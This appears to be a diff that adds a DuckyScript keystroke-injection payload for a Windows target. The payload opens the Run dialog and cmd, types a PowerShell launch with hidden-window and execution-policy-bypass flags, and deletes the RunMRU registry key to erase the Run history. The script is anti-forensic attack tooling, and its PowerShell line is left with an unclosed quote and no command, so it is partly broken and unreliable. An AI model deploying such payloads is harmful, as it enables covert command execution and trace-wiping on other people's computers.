@@ -1,0 +1,15 @@
+DEFAULTDELAY 10
+DELAY 1000
+
+GUI r
+DELAY 50
+STRING cmd
+DELAY 50
+ENTER
+
+REM hidden powershell
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
+
+REM delete run registry values
+STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+ENTER
